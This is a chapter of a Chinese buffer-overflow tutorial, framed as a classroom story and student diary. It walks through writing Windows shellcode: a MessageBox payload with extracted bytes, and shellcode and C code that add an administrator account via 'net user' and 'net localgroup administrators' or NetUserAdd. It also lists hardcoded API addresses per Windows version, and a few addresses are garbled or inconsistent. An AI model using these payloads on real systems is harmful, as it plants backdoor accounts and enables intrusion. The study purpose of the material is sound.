# 第二章、Windows 下 ShellCode 编写初步

“上课了，上课了！”同学们一边兴高采烈的讨论着一边步入教室。新的一周又开始了。

“嗯，大家经过这两次课的学习，有什么感觉啊？”老师等同学们坐好后问。

“噢，这几次课我们对溢出编写的基本思路有了清晰的了解；掌握了利用缓冲区溢出的两种方式；同时还对大量的实际漏洞进行了成功的编写。”古风认真的说道。

“嗯，让我们的兴趣和技术都得到了很大的提升。”玉波说。

“同时，我们也认识到了真正的黑客精神是钻研和共享！” 宇强佩服的说道。

“……”

“好！”老师赞扬道，“大家有了这些认识就很好！只要有了兴趣和钻研的精神，就可自主的不断深入下去；同时，有了共享的精神，就会得到别人的尊敬，并且一同讨论、一起进步。”

“嗯！”大家认真的点点头。

“但是，老师。”宇强说道：“虽然我们的溢出水平的确有所提高。但在实际编程中，对 ShellCode 的编写不是特别明白，对复杂漏洞（比如堆溢出漏洞）也还不清楚，希望能继续的学习。”

老师笑道：“呵呵，别着急，在后面的章节中我们会慢慢深入下去的。大家有这个不断学习的想法就很好！再提醒一次，学习更重要的是方法，而不是技术本身。如果你掌握的只是技术，技术会很快过时，那你就没有机会了；如果掌握的是方法，那你就能很轻松的应对技术的变迁。”

大家齐声答道：“嗯，我们一定会注意的！”

老师说道：“那好，首先我们一起来看看 ShellCode 的编写吧！”

# 2.4 弹出 Windows 对话框 ShellCode 的编写

## 2.4 弹出 Windows 对话框 ShellCode 的编写

“刚才 ShellCode 的功能是弹出 DoOS 窗口控制台，虽然可以让我们做很多事情；但黑乎乎的，有点不爽！”玉波开玩笑说。

“是啊，爱美之心人皆有之，我也这么认为。”老师说。

“呵呵，是啊！”大家都笑了。

“好。那我们来写一个‘漂亮点’的 ShellCode 吧！弹出一个 Windows 图形界面的对话框，如何？

“好啊！”

# 2.4.1 C 程序解释

### 2.4.1 C 程序解释

“要弹出一个 Windows 对话框，user32.dll 中的 MessageBox 函数可以帮助我们完成这个功能。”老师说道。

“简单的说，程序只要一句话，实现如下。”

```
#include "windows.h"
int main(int argc, char* argv[])
{
         LoadLibrary("user32.dll");
         MessageBox(0, "ww0830","ww", 1);         
         return 0;
} 
```

“首先，‘LoadLibrary("user32.dll")’是加载 user32.dll 动态链接库，大家都应该清楚吧！”

“然后，‘MessageBox(0, "ww0830","ww", 1)’是弹出 Windows 对话框。我们执行，可以看到对话框的标题是‘ww’，里面的内容是‘ww0830’。如图 2－16，好看多了吧？”

![](img/Q 版缓冲区溢出教程 53605.jpg)

古风核对了一下说道：“哦！那说明 MessageBox 函数带的第二个参数‘ww0830’是对话框内容，第三个参数‘ww’是标题内容？”

“恩，是的！”

“那还有第一个和最后一个参数呢？一个用的是 0，另一个用的是 1，又代表什么意思呢？”古风继续问道。

“呵呵！我们看看官方（微软）给的定义吧！第一个参数的帮助信息如下：”

```
hWnd 
[in] Handle to the owner window of the message box to be created. If this parameter is NULL, the message box has no owner window. 
```

“意思是，第一个参数表明对话框所属的窗口句柄。如果第一个参数为 NULL（即 0），那么对话框不属于任何窗口。这里我们用的就是 0，弹出不属于任何窗口的对话框。”

“而最后一个参数，是表明对话框的类型。0 代表 MB_OK，即只有一个‘OK’按钮；1 代表 MB_OKCANCEL，对话框会有‘OK’和‘Cancel’两个按钮。这里我们用的就是 1，两个按钮的对话框比较好看吧！”

“对话框还有很多类型，比如 MB_RETRYCANCEL、MB_YESNO、MB_YESNOCANCEL 等，大家可以下去自己看看。”

“这里我们接着分析汇编和 ShellCode 的生成。”

# 2.4.2 生成汇编和 ShellCode

### 2.4.2 生成汇编和 ShellCode

“对比前面的分析。执行 system(“command.exe”) 时，先把参数 command.exe 字符串的地址入栈，再 call system 的地址就行了。”

“那么，执行 MessageBox(0, "ww0830","ww", 1) 就是把四个参数从右至左压入堆栈，即先压 1，再压‘ww’字符串的地址，然后是‘ww0830’字符串的地址，最后压 0；接着 CALL MessageBox 函数的地址就 OK 了。”

“1 和 0 多好压啊！只要 PUSH 0、PUSH 1 就完成了。”玉波嚷道，“可惜还有两个参数呢！如果参数都是数字就好了。”

宇强想想后，问道，“那‘ww’和‘ww0830’这两个参数串莫非像构造 command.exe 字符串那样，先在栈里面构造出来，然后把它们的地址作为参数入栈？”

“太对了！”老师表扬道，“第三个参数‘ww’是对话框标题，我们在‘ebp－0Bh’和‘ebp-0A’的地方都放‘w’，而‘ebp-09’放字符串结束标志 0x00。那么，‘ebp－0Bh’就是字符串的地址了。示意图如图 2－17。”

![](img/Q 版缓冲区溢出教程 54686.jpg)

“我们把‘ebp－0Bh’放在 ESI 中保存起来，等会儿作为参数入栈，代码如下：”

```
//标题"ww"->esi
mov byte ptr[ebp-0Bh],77h//w
mov byte ptr[ebp-0Ah],77h//w
mov byte ptr[ebp-09h],0h//0x00
lea esi,[ebp-0Bh] 
```

“然后第二个参数（对话框的内容）‘ww0830’也是类似。我们把它放在‘ebp-07h’开始的地方，并保存在 ESI 中，代码如下：”

```
//内容"ww0830"->edi
mov byte ptr[ebp-07h],77h//w
mov byte ptr[ebp-06h],77h//w
mov byte ptr[ebp-05h],30h//0
mov byte ptr[ebp-04h],38h//8
mov byte ptr[ebp-03h],33h//3
mov byte ptr[ebp-02h],30h//0
mov byte ptr[ebp-01h],0h//0x00
lea edi,[ebp-07h] 
```

“参数都构造好了。最后我们合起来执行 MessageBox(0, "ww0830","ww", 1) 吧！”

“第四个参数是 1，我们就直接 PUSH 1；倒数第二个参数是标题字符串的地址，我们存在 ESI 中的，所以 PUSH ESI；同样，内容字符串的地址是在 EDI 中，我们 PUSH EDI；第一个参数是 0，我们 PUSH 0。”

“参数都入栈后，我们 CALL messagebox 函数的地址。在我的机器上，函数的地址是 0x77d3add7，我们直接 CALL 0x77d3add7 就完成执行函数了。这段汇编代码如下：”

```
push 1                          //1
push esi                        //标题
push edi                       //内容
push 0                          //0
mov eax,77d3add7h       //messageboxa()
call eax 
```

“合起来，在 VC 中用 __asm{}嵌入，编译并执行，还是弹出对话框。成功！如图 2－18。”

![](img/Q 版缓冲区溢出教程 55685.jpg)

“哦！又成功了！”大家满脸喜悦。

“接下来大家提取 ShellCode 吧！也顺便再复习一下。”

“好的，在 VC 中按 F10 调试，然后调出汇编和对应的机器码，如图 2－19。我们把对应的机器码抄下来就可以了。”古风边说边抄。

![](img/Q 版缓冲区溢出教程 55799.jpg)

古风抄完后说道：“这样得到弹出 Windows 对话框的 ShellCode 如下。”

```
Char ShellCode[] = 
    “\x55\x8B\xEC\x81\xEC\x80\x00\x00\x00\xC6\x45\xF5\x77\xC6\x45“
    “\xF6\x77\xC6\x45\xF7\x00\x8D\x75\xF5\xC6\x45\xF9\x77\xC6\x45“
    “\xFA\x77\xC6\x45\xFB\x30\xC6\x45\xFC\x38\xC6\x45\xFD\x33\xC6“
    “\x45\xFE\x30\xC6\x45\xFF\x00\x8D\x7D\xF9\x6A\x01\x56\x57\x6A“
    “\x00\xB8”
    “\xD7\xAD\xD3\x77”    //MessageBox 函数的地址
    “\xFF\xD0” 
```

“再拿溢出程序测试就可以了。”古风抹抹了汗说。

“嗯，不错！希望大家都能理解好原理，掌握好方法。今天早点放学，我给大家再布置一个作业，回去独立完成一个 ShellCode，功能是在系统上添加一个用户，并把它加成管理员身份，下节课我会让一位同学上台来给大家讲解他的完成过程。大家都要认真准备啊！不然上台说不出话来，被大家笑话就不好意思了吧！班上还有女生呢！OK，今天到此为止，放学！”

# 2.5 添加用户 ShellCode 的编写

## 2.5 添加用户 ShellCode 的编写

以下摘自宇强的日记。

# 2.5.1 小强的日记之二——添加用户 ShellCode 的编写

### 2.5.1 小强的日记之二——添加用户 ShellCode 的编写

9 月 23 日 阴

这几次课都在学习缓冲区溢出利用的编程，现在已经进入 ShellCode 的编写阶段了。经过这几次的学习，自己对 ShellCode 的编写有了初步了解，知道 ShellCode 是如何来的，感觉在老师的指导下又有了很大进步。但要搞懂整个技术还有很长的路要走，自己一步步来吧！

老师还布置了作业，留给我的一个是找 Win2000 SP2 下 LoadLibrary 和 system 函数的地址；另一个是写一个在系统中添加一个管理员用户的 ShellCode，并让人上台讲。在回家的路上，我就想，自己一定要认真准备准备，不然抽到了我，上去什么都说不出来，其不惨了？

回到家后，匆匆吃完饭，就坐到电脑前考虑这两个问题。

对第一个找函数地址的问题，比较简单。我把老师给的程序拷到 Win2000 SP2 系统上，并加上找 LoadLibrary 的语句，得到 GetLoadSysAdd.cpp，就像图 2－20，然后编译、执行。

![](img/Q 版缓冲区溢出教程 56862.jpg)

这个程序有问题，system 函数的地址找到了，是 0x77E6A254，但 LoadLibrary 地址为 0，表示没有找到。当时很奇怪，自己也一下子紧张了起来，马上上网找了很久才发现，在系统中是没有 LoadLibrary 这个函数的，只有 LoadLibraryA 和 LoadLibraryW 这两个函数，在 ASCII 参数时系统会用 LoadLibraryA，在 Unicode 参数时会用 LoadLibraryW。至于什么是 ASCII，什么是 Unicode，自己还不清楚，只有明天问老师了。

于是我马上把程序改成 LoadLibraryA 并执行，这下正确了，如图 2－21。

![](img/Q 版缓冲区溢出教程 57144.jpg)

看到在 Win2000 SP2 上，system 函数地址为 0x78019B4A，LoadLibraryA 函数的地址为 0x77E6A254，我忙把它们抄了下来。第一个问题总算解决了，长松了一口气，心里稍微平缓了些。

然后我继续考虑第二个问题，编写添加用户的 ShellCode。在 Windows 中添加用户，要么在控制面板里的“用户帐号”中添加，要么在 DOS 命令行下执行 net user name /add ；要把一个帐户添加到管理员，则要在 DOS 命令行下执行 net localgroup administrators name /add 。

看来这里只有使用命令行下的指令添加用户了。我仿照老师的步骤，先写出 C 的程序，然后改成汇编，最后提取出 ShellCode。

和开 DOS 窗口的程序类似，添加一个名为“c”的管理员，其 C 程序代码如下：

```
#include <windows.h>
int main()
{
       LoadLibrary("msvcrt.dll");
       system("net user c /add");
       system("net localgroup administrators c /add");
       return 0;
} 
```

即执行用户添加命令，再将用户执行升为管理员。我测试了一下，将程序命名为“AddUserC.c”，编译执行，成功了！添加了一个名为“c”的管理员用户，如图 2－22。

![](img/Q 版缓冲区溢出教程 57786.jpg)

然后最困难的地方到了：把上面的程序改成汇编。

第一句“LoadLibrary(“msvcrt.dll”)”可以把老师给的程序抄过来。

第二、三句就要把老师给的代码稍微改一下，将参数改成这里的参数才行。

对“system("net user c /add")”这句话，就按 Windows 系统执行函数的原理，先参数入栈，再 CALL system 函数的地址。这里的参数是“net user c /add”字符串的地址，所以先在栈中构造出“net user c /add”，即这样：

```
mov esp,ebp ;        把 ebp 的内容赋值给 esp
push ebp ;             保存 ebp，esp 则减 4
mov ebp,esp ;        给 ebp 赋新值，将作为局部变量的基指针
xor edi,edi ;
push edi ;  压入 0，esp－4，作用是构造字符串的结尾\0 字符
push edi
push edi
push edi ;   加上上面，一共有 16 个字节，用来放“net user c /add” 
mov byte ptr [ebp-0Fh],6eh ;n
mov byte ptr [ebp-0eh],65h ;e 
mov byte ptr [ebp-0dh],74h ;t
mov byte ptr [ebp-0ch],20h ;
mov byte ptr [ebp-0bh],75h ;u
mov byte ptr [ebp-0ah],73h ;s
mov byte ptr [ebp-09h],65h ;e
mov byte ptr [ebp-08h],72h ;r
mov byte ptr [ebp-07h],20h ;
mov byte ptr [ebp-06h],63h ;c
mov byte ptr [ebp-05h],20h ;
mov byte ptr [ebp-04h],2Fh ;/
mov byte ptr [ebp-03h],61h ;a
mov byte ptr [ebp-02h],64h ;d
mov byte ptr [ebp-01h],0h ;0 
```

字符串构造好后，再把 ESP——现在“net user c /add”串的地址作为参数，压入堆栈：

```
lea eax,[ebp-0fh] ;
push eax ;              字符串地址作为参数入栈 
```

最后 CALL system 函数的地址（即 0x78019B4A）：

```
mov eax, 0x78019B4A ;        win2000 sp2 system 函数地址
call eax ;                              调用 system 
```

上面的代码弄了半天才弄好。测试了一下，先把另外两句保留，只把“system("net user c /add")”改为上面的汇编，得到“AddUserASM.cpp”，运行结果如图 2－23，成功了！

![](img/Q 版缓冲区溢出教程 59071.jpg)

当看到“命令成功完成”的提示时，我难以抑止心中那种狂喜的冲动，从椅子上跳了起来，把手握成拳头从空中划过，大吼了一声“Yeah”！当时的心情只有经历过千辛万苦最后成功的人才能体会到。那个时刻，我深深感受到了研究缓冲区编程的魅力。

父母推开门，问我发生了什么事，我笑了笑，告诉它们没什么，只是解决了一个技术问题。他们嘱咐我不要太累、注意早点休息后又出去了。心情稍平静后，我再次坐了下来，把剩下的“LoadLibrary(“msvcrt.dll”)”和“system("net localgroup administrators c /add")”也仿照着改为汇编，得到了“AddUserAllASM.cpp”，再次编译执行，还是成功了！

可能因为刚才太过兴奋，这次我的心情没那么激动了。最后剩下的只有体力活了，我按老师讲的方法在 VC 中按 F10 键进入调试状态，把汇编对应的机器码抄下来，得到了自己写的第一个 ShellCode。太有成就感了！

提取出 ShellCode 后，把它存在“AddUserCode.cpp”里，但发现还不知道如何验证是否正确，明天去问问老师吧！

ShellCode 比较长，我抄了很久，抄完后觉得好累啊！一看表，不知不觉夜都深了，今天就到这里吧，休息了，明天继续认真听课。那个小倩，今天看了我两眼，不知是否对我也有感觉呢？不想了，.继续努力吧！把握好大学这四年的时光，无悔这青春岁月。

到这里，我想起了一首诗。

取天狼

昨夜小风残月，望断天狼斜射。

万里苍穹茫茫，吾心蓦然雄起。

直取天狼，天为证。

若是它年不出头，甘愿忍受一生愁。

男儿立志扫四方，天狼星，英雄取。

海到无边天做岸，山登至极我为峰。

好个海到无边天做岸，山登至极我为峰！以此句为座右铭，提醒自己，时时努力，不敢松懈！

# 2.5.2 小强的日记之三——添加用户的另一种方法

### 2.5.2 小强的日记之三——添加用户的另一种方法

9 月 27 日 晴

今天是个艳阳天，就如同我的心情一样，晴空万里。

上午一大早我就去了教室，看了一会儿书，同学们才陆续到来。上课铃响后，老师走进了教室，问大家查找 LoadLibrary 和 system 函数地址的问题解决得怎么样。大家都把 system 函数的地址找到了，并一一报了出来。而 LoadLibrary 的地址其他人都说没有找到，老师最后问到了我，我说内存中没有 LoadLibrary 的函数，只有 LoadLibraryA 和 LoadLibraryW 函数，我找了 LoadLibraryA 的地址。老师高兴的说：“就是这样的。”并解释道：“在 Win2000 下，系统只有 LoadLibraryW 的实现，LoadLibraryA 只有一个壳。如果调用 LoadLibraryA，其实也是系统自动把 ASCII 参数变为 Unicode 参数，再调用 LoadLibraryW 函数。”

老师还把 ASCII 和 Unicode 的差别讲了一下。

小知识：ASCII 和 Unicode

ASCII 编码是用一个字节来表示字符，这样只有 256 种组合，能表达的字符有限。而 Unicode 是用两个字节（16 位）来表示字符，这样共有 65536 种组合，可以表达完世界上的所有文字。为了世界化推广产品、减少成本以及提高效率，现在人们都更多的使用 Unicode 编码。

Unicode 只是一个字形和内码上的标准，并没有定义实际在电脑中存取的方法。因此，Unicode 协会便定义了一整套存取 Unicode 编码的转换格式，称之为 UTF，常用的格式有 UTF-8 和 UTF-16。

接下来是讨论时间，老师找一位同学上去讲昨天的作业——添加用户的 ShellCode 的编写。当时老师环顾了一下大家，并问有没有同学自愿。我心里很矛盾，既想上去让大家看看我的成果，又怕讲得不好。最后在老师的再三激励以及小倩 MM 期待的目光下，我勇敢的站了起来，并在大家的掌声中走上了讲台。

在台上，我把昨天在家中的分析和实现过程详细的说了一遍，并把提取出来的 ShellCode 拿给老师和同学们看，结果得到了老师和同学们的一致肯定和表扬。

就是在台上的时候太紧张了，下台坐好后，才发现自己一身的汗水，腿也在不断打颤，幸好大家都看不到，特别是小倩，不然多没面子啊！相信有了这次经验，下次要好得多，希望以后能有更多类似的锻炼机会。

最后老师还给出了一种新的添加用户的版本，其 C 代码如下：

```
#ifndef UNICODE
#define UNICODE
#endif
#include <stdio.h>
#include <windows.h> 
#include <lm.h>
#pragma comment(lib,"netapi32")
int wmain()
{
       USER_INFO_1 ui;
       DWORD dwError = 0;
       ui.usri1_name = L"ww0830";
       ui.usri1_password = L"ww0830";
       ui.usri1_priv = USER_PRIV_USER;
       ui.usri1_home_dir = NULL;
       ui.usri1_comment = NULL;
       ui.usri1_flags = UF_SCRIPT;
       ui.usri1_script_path = NULL;
       //添加名为 ww0830 的用户，密码也为 ww0830   
       if(NetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError) == NERR_Success)
       {
              //添加成功
              printf("Add user success.\n");
       }
       else
       {
              //添加失败
              printf("Add user Error!\n");
              return 1;
       }
       wchar_t szAccountName[100]={0};
       wcscpy(szAccountName,L"ww0830");
    LOCALGROUP_MEMBERS_INFO_3 account;
       account.lgrmi3_domainandname=szAccountName;
       //把 ww0830 添加到 Administrators 组
       if(NetLocalGroupAddMembers(NULL,L"Administrators",3,(LPBYTE)&account,1)== NERR_Success )
       {
              //添加成功
              printf("Add to Administrators success.\n");
              return 0;
       }
       else
       {
              //添加失败
              printf("Add to Administrators Fail!\n");
              return 1;
       }   
} 
```

这种方法用的是 Netapi32.dll 里的 NetUserAdd 和 NetLocalGroupAddMembers 函数。好酷啊！执行效果如图 2－24。当时我就下定决心：自己会复杂 ShellCode 的编写后，一定要把它改为机器码的 ShellCode。

![](img/Q 版缓冲区溢出教程 62336.jpg)

不过我又想到，那些实际的 ShellCode 是怎样的呢？如果只是添加个用户，用处不是很大，于是我提出了自己的疑问。

老师又表扬了我，说考虑得很全，并说下节课继续复杂的 ShellCode 的研究，写一个真正的 ShellCode。

看到小倩又看了我一眼，心里为之一动。她这一望，有什么意思呢？她也知道我的一片心情吗？

最远的距离不是天涯海角，而是在你身边却不知道我爱你。

可能以后自己会慢慢理解这句话吧！

可惜今天我要早点去亲戚家吃饭，下课后就急急忙忙的走了。

晚上去外婆家玩到很晚。一家人聚在一起吃饭很是热闹，很久没有这样放松过了。作业完成得很好，也可以好好的休息一下了，今天真是惬意啊！

# 课后解惑

## 课后解惑

Q：我在 Windows 2000 SP2 版本下，查找到 LoadLibraryA 函数的地址是 0x77E6A254，system 函数的地址是 0x78019B4A，都是正确的，但为什么我把 ShellCode 对应的地方改成“\x77\xE6\xA2\x54”和“\x78\x01\x9B\x4A”后，不能弹出 DOS 窗口呢？

A：你把字节的顺序写反了，应该是“\x54\xA2\xE6\x77”和“\x4A\x9B\x01\x78”。

Q：哦！改动后的确能正确弹出 DOS 对话框了，但为什么顺序要是这样呢？好别扭啊！

A：在 Windows 系统下，多字节数存放的规则是：数的高位放在内存高址，数的低位放在内存低址。对 0x77E6A25478 来说，0x77 是最高位，所以要放在内存的高地址，而在字符串中，是按照内存从低到高排列的，所以要把 0x77 放在字符串中数的最后。在后面的章节中还会讲到。

Q：能不能给出一些系统下 LoadLibraryA 函数和 system 函数的地址值呢？

A：好的。LoadLibraryA 和 system 函数的地址在 Win2000 SP0 下，分别是 0x77E78023 和 0x7801AAAD；在 SP2 下分别是 0x77E6A254 和 0x78019B4A；在 SP3 下分别是 0x77E69F64 和 0x7801AFC3；在 XP SP0 下分别是 0x77E605D8 和 0x77BF8044。

要注意的是，覆盖的跳转地址也要符合相应版本，最好使用通用地址。

Q：为什么 LoadLibrary 函数在系统里面有 LoadLibraryA 和 LoadLibraryW 两种实现？而 system 只有一个实现，没有 systemA 或 systemW 呢？

A：问得好！这是因为在 Windows 下，存在几种编程接口。

一种是 Windows API 函数。这类函数是和 Windows 系统相关的，使用的也是 Windows 下才特有的数据类型（比如 CHAR）。API 函数就存在 A 和 W 这两种实现，而 LoadLibrary 是 API 函数。

另一种是 C 运行链接库，是按照 C 语言的标准来实现的，所以只有小写字母，而且只有一种实现，比如 system 函数。

Q：那怎么区分 API 函数和 C 运行库函数呢？

A：从函数的命名可以看出来。API 函数遵循的是 Windows 自己定义的命名规范，是大?濨氷? 小写混写的函数，如 LoadLibrary；而在 C 语言标准中，规定函数名称都是小写，所以 C 运行库函数也遵循全是小写的规范，如 system。

Q：为什么 Windows 会有两种命名规范呢？

A：因为微软想遵循一种更科学的命名规范，所以规定了 API 函数命名法则；但为了保持和标准 C 语言的兼容，C 运行库函数还是遵循了 C 语言标准的规定；所以存在了两种命名规范。

Q： 那我们自己编程时用那种命名规则呢？

A：哈哈！命名规则应和所用的操作系统或开发工具的风格保持一致。例如，Windows 应用程序的标识符通常用“大小写”混排的方式，如 AddChild；而 Unix 应用程序的标识符用“小写加下划线”的方式，如 add_child。别把这两类风格混在一起用。

我们自己开发时，在 Windows 下建议使用“匈牙利”命名规则，类名和函数名用大写字母开头的单词组合而成，变量和参数用小写字母开头的单词组合而成，常量全用大写，全局变量加前缀“g”，类的数据成员加前缀“m_”。

Q： 我们如何验证提取出的 ShellCode 是否正确呢？太容易抄错了。

A：有两种方法。一种方法是在实际溢出程序中，使用提取出的 ShellCode 测试，看能否达到效果；另一种方法就是把 ShellCode 数组当成一个函数来执行，其实现办法会在下一章的“验证 ShellCode 功能方法”中讲到。

Q： 好像 ShellCode 里面不能有 0x00，为什么呢？怎么避免呢？

A：因为 0x00 是字符串的结束符，如果 ShellCode 中存在，就会被截断；我们会在 ShellCode 变形大法一章中详细的讲解如何避免 0x00 的方法。